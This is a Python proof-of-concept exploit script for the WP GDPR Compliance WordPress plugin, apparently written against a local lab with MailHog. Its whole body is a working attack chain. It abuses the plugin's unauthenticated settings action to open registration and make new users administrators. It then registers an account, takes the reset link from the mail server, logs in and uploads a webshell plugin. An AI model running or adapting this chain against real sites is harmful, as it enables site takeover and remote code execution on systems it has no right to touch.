import sys
import json
import hashlib
import requests
from bs4 import BeautifulSoup
from urllib import request, parse

def send_request(queryUrl, data):
    """ Wrapper for sending a request.

    Input: queryUrl (str), data (dict)
    Output: [ response_code (int), response_body (str) ]
    """
    try:
        print("Send request to {}...".format(queryUrl))
        headers = { 'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; Win64; x64)' }
        if data is None:
            # GET request (payload == None)
            req = request.Request(queryUrl, headers=headers)
            resp = request.urlopen(req)
        else:
            # POST request (payload != None)
            req = request.Request(queryUrl, headers=headers, data=data.encode("utf-8"))
            resp = request.urlopen(req)
        return [resp.getcode(), resp.read().decode("utf-8")]
    except:
        print("[-] Unexpected error while sending a request to {}.".format(queryUrl))
        return False, []


def exploit(host):
    """ WP GDPR Compliance Plugin Exploit PoC
    
    Input: Host Address
    Output: URL of Uploaded PHP File
    """

    NOERROR = '{"message":"","error":""}'    
    baseUrl = host
    print("\nExploit WP GDPR Compliance Plugin @ {}\n".format(baseUrl))
    print("[~] Let's check if our target vulnerable plugin is installed.")

    # Check if plugin is installed or not
    target_url = "{}/wp-content/plugins/wp-gdpr-compliance/readme.txt".format(baseUrl)
    respCode, _ = send_request(target_url, None)
    if respCode is 200:
        print("[+] Target Exists. Let the exploit begin.")
    else:
        print("[-] Cannot find target. Please check the plugin installation path.")
        return False

    # Get ajaxSecurity for POST
    respCode, respBody = send_request(baseUrl, None)
    ajaxSecurityVal = ""
    if respCode is 200:
        soup = BeautifulSoup(respBody, "html.parser")
        for item in soup.findAll("script"):
            if "ajaxSecurity" in item.text:
                ajaxSecurityVal = (item.text).split('"ajaxSecurity":"')[1]
                ajaxSecurityVal = ajaxSecurityVal.split('"')[0]
    else:
        print("[-] Not able to access index page.")
        return False

    if ajaxSecurityVal == "":
        print("[-] Not able to obtain the value of ajaxSecurity.")
        return False

    # Request POST to enable sign up
    queryUrl = "{}/wp-admin/admin-ajax.php".format(baseUrl)
    data = 'action=wpgdprc_process_action&security='
    data = data + ajaxSecurityVal
    data = data + '&data={"type":"save_setting","append":false,"option":"users_can_register","value":"1"}'
    _, respBody = send_request(queryUrl, data)
    if NOERROR in respBody:
        print("[+] Successfully set option to anyone can register.")
    else:
        print("[-] Failure to set anyone can register.")
        return False

    # Request POST for signing up as Admin
    queryUrl = "{}/wp-admin/admin-ajax.php".format(baseUrl)
    data = "action=wpgdprc_process_action&security="
    data = data + ajaxSecurityVal
    data = data + '&data={"type":"save_setting","append":false,"option":"default_role","value":"administrator"}'
    _, respBody = send_request(queryUrl, data)
    if NOERROR not in respBody:
        print("[-] Failure to set default role as admin.")
        return False
    print("[+] Successfully set option to default role as admin.")

    # Delete all messages in mailhog - Reset SMTP Mail server
    queryUrl = "http://localhost:8025/api/v1/messages"
    resp = requests.delete(queryUrl)
    if resp.status_code != 200:
        print("[-] Error while removing messages on MailHog")
        return False
    print("[+] Removed all messages on MailHog")
    
    # Sign up a new user
    queryUrl = "{}/wp-login.php?action=register".format(baseUrl)
    data = "user_login={}&user_email={}&redirect_to=/login&wp-submit=Register".format(USERNAME, EMAIL)
    respCode, respBody = send_request(queryUrl, data)
    if respCode != 404:
        if "login_error" in respBody:
            print("[-] There was an error while signing up.")
            soup = BeautifulSoup(respBody, "html.parser")
            errormsg = soup.find("div", {"id":"login_error"})
            print(errormsg.text)
            return False
    print("[+] Successfully registered to target WP Site.")
    
    # Parse confirmation email to get key from mailhog
    queryUrl = "http://localhost:8025/api/v1/messages"
    setpwUrl = ""
    setpwKey = ""
    respCode, respBody = send_request(queryUrl, None)
    if respCode is 200:
        messages = json.loads(respBody)
        for message in messages:
            if "Raw" in message:
                msgRaw = message["Raw"]
                if "Data" in msgRaw:
                    msgData = msgRaw["Data"]
                    if "To set your password, visit the following address" in msgData:
                        msgData = msgData.split("\r\n\r\n")
                        for data in msgData:
                            if ("login.php" in data) and ("action=rp&key=" in data):
                                setpwKey = (data.split("key=")[1]).split("&")[0]
                                setpwUrl = data[1:-1]
    else:
        print("[-] Cannot find confirmation email from mailhog.")
        return False
    
    # Exception for key not found error
    if (setpwKey == "") or (setpwUrl == ""):
        print("[-] Cannot retrive password reset URL from mailhog.")
        return False
    
    print("[+] Successfully retrive the reset password page URL from the email.")

    # Reset password with the key obtained from Mailhog
    wphash = hashlib.md5(baseUrl.encode("utf-8")).hexdigest()
    wpcookieKey = "wp-resetpass-{}".format(wphash)
    wpcookieVal = "{}%3A{}".format(USERNAME, setpwKey)
    queryUrl = "{}/wp-login.php?action=resetpass".format(baseUrl)
    headers = { 'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; Win64; x64)' }
    cookies = { 
        'wordpress_test_cookie': 'WP+Cookie+check', 
        wpcookieKey: wpcookieVal 
    }
    data = { 
        'pass1':PASSWORD, 
        'pass1-text':PASSWORD, 
        'pass2':PASSWORD, 
        'rp_key': setpwKey, 
        'wp-submit':'Reset Password'
    }
    resp = requests.post(queryUrl, headers=headers, cookies=cookies, data=data)
    if "Your password has been reset." not in resp.text:
        print("[-] Cannot reset password.")
        return False
    print("[+] Successfully reset the password of {}.".format(USERNAME))
    
    # Login to WP Admin
    queryUrl = "{}/wp-login.php".format(baseUrl)
    headers = { 'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; Win64; x64)' }
    cookies = { "wordpress_test_cookie": "WP+Cookie+check" }
    data = {
        "log": USERNAME,
        "pwd": PASSWORD,
        "wp-submit": "Log In",
        "redirected_to": "http://localhost:8000/wp-admin/",
        "testcookie": "1"
    }
    resp = requests.post(queryUrl, headers=headers, cookies=cookies, data=data)
    if len(resp.history) > 0:
        cookiesLoggedin = resp.history[0].cookies.get_dict()
    else:
        print("[-] Cannot find login cookies from history of logging in.")
        return False
    print("[+] Successfully Logged in to WP Admin panel.")

    # Upload webshell thru plugins
    queryUrl = "{}/wp-admin/plugin-install.php".format(baseUrl)
    headers = { 'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; Win64; x64)' }
    resp = requests.get(queryUrl, headers=headers, cookies=cookiesLoggedin)
    if "_wpnonce" in resp.text:
        soup = BeautifulSoup(resp.text, "html.parser")
        wpnonce = soup.find("input", {"name":"_wpnonce"})['value']
        wp_http_referer = soup.find("input", {"name":"_wp_http_referer"})['value']
    else:
        print("[-] Cannot find wpnonce from response text.")
        return False
    print("[+] Successfully retrive wpnonce and wp_http_referer")

    queryUrl = "{}/wp-admin/update.php?action=upload-plugin".format(baseUrl)
    headers = { 'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; Win64; x64)' }
    fileobj = open("wp-shell.zip", "rb")
    data = {"_wpnonce":wpnonce, "_wp_http_referer":wp_http_referer}
    resp = requests.post(queryUrl, headers=headers, cookies=cookiesLoggedin, data=data, files={"pluginzip": ("wp-shell.zip", fileobj, 'application/zip')})
    print("[+] Successfully upload webshell plugin. Please visit {}/wp-content/plugins/wp-shell/wp-shell.php".format(baseUrl))
    result_url = "{}/wp-content/plugins/wp-shell/wp-shell.php".format(baseUrl)
    return result_url


if __name__ == "__main__":
    """ Let's exploit! """
    try:
        exploit(TARGET_HOST)
    except:
        print("[-] Unexpected error while exploiting...")
        print("    Error: {}".format(sys.exc_info()[0]))